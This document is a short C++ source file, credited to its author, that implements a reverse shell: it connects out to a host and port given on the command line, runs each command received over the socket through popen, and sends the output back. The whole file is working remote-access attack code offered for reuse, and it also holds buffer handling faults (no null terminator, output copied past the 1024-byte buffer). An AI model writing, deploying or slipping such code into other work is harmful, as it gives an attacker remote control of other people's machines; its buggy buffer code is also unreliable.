// WRITEN BY RAFAEL "LOPSEG" RODRIGUES DA SILVA
// FEEL FREE TO MAKE CHANGES
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdexcept>
#include <string>

void error(const char *msg)
{
    perror(msg);
    exit(0);
}

std::string exec(char* cmd) {
    char buffer[128];
    std::string result = "";
    FILE* pipe = popen(cmd, "r");
    if (!pipe) throw std::runtime_error("popen() failed!");
    try {
        while (!feof(pipe)) {
            if (fgets(buffer, 128, pipe) != NULL)
                result += buffer;
        }
    } catch (...) {
        pclose(pipe);
        throw;
    }
    pclose(pipe);
    return result;
}

int main(int argc, char *argv[])
{
    int sockfd, portno, n;
    struct sockaddr_in serv_addr;
    struct hostent *server;

    char buffer[1024];
    if (argc < 3) {
       fprintf(stderr,"usage %s hostname port\n", argv[0]);
       exit(0);
    }
    portno = atoi(argv[2]);
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0)
        error("ERROR opening socket");
    server = gethostbyname(argv[1]);
    if (server == NULL) {
        fprintf(stderr,"ERROR, no such host\n");
        exit(0);
    }
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    bcopy((char *)server->h_addr,
         (char *)&serv_addr.sin_addr.s_addr,
         server->h_length);
    serv_addr.sin_port = htons(portno);
    if (connect(sockfd,(struct sockaddr *) &serv_addr,sizeof(serv_addr)) < 0)
        error("ERROR connecting");

    int i;
    std::string output;
    while(1){


        n = read(sockfd,buffer,1024);

        if (n < 0) std::cout <<"ERROR reading from socket" << std::endl;

        output =  exec(buffer);

        for(int x=0; x<output.length(); x++)
        {
          buffer[x] = output.at(x);
        }

        n = write(sockfd,buffer,output.length());

        if (n < 0) std::cout << "ERROR writing to socket" << std::endl;
        if (!strcmp(buffer, "exit")) break;
        bzero(buffer,256);
  }

    close(sockfd);
    return 0;
}
